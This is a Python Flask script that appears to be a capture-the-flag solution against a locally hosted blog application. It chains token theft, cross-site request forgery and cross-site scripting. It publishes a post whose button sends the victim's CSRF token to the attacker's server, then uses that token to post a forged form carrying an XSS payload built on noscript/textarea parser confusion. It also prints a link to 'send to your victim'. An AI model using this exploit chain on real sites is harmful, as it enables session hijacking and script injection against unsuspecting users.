
from crypt import methods
from flask import Flask, render_template, request, redirect, url_for, flash, g
import requests
import os

TARGET_DOMAIN = "http://127.0.0.1:5000"
HOST_DOMAIN = "http://127.0.0.1:5001"

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index_view():
    csrf_token = request.form['csrf_token']
    url = create_csrf(csrf_token)
    print(f"Stolen token: {csrf_token}")

    page = f"""
    <iframe src={url}?share width=500 height=500></iframe>
    <meta http-equiv="refresh" content="2; URL={TARGET_DOMAIN}/edit">
    """
    return page # redirect(url)

def publish_blog(content):
    session = requests.Session()

    # Login
    url = f"{TARGET_DOMAIN}/login"    
    res = session.get(url)
    my_csrf_token = res.text.split('csrf_token" value="')[1].split('"/>')[0]
    print(f"My CSRF token: {my_csrf_token}")

    data = {"name": os.urandom(8).hex(), "csrf_token": my_csrf_token}
    res = session.post(url, data)

    my_csrf_token = res.text.split('csrf_token" value="')[1].split('"/>')[0]
    print(f"My CSRF token: {my_csrf_token}")

    # Publish Post
    url = f"{TARGET_DOMAIN}/edit"
    data = {"content": content, "tags": "a,b,c", "csrf_token": my_csrf_token}
    res = session.post(url, data)
    return res.url

def create_csrf(csrf_token):
    # <textarea></textarea>
    xss_payload = '''
        comment"); alert(document.querySelector(".navbar-brand").innerText.split(" ")[2]);//
        <noscript><p title='</noscript>&lt;/TEXTAREA&gt; <div></div></FORM><xx swallow="'>
        </p></noscript>
    '''
    csrf_payload = f""""       
        <form action="/edit" method="POST">
            <input type="hidden" name="csrf_token" value="{ csrf_token }"/>
            <textarea name="content">
            { xss_payload }
            </textarea>
            <input type=hidden name=tags value=abcabc />
            <input id="share-button" type="submit">Click</input>
        </form>
    """
    url = publish_blog(csrf_payload)
    return url

def prepare():    
    content = f"""
        <input id="share-button" formaction="{HOST_DOMAIN}" type="submit" form="comment-form">
            DO NOT CLICK ME
        </input>
    """
    url = publish_blog(content)
    print(f"Send the following URL to your vitim:\n{url}?share")
    
if __name__ == '__main__':
    prepare()
    app.run(port=5001)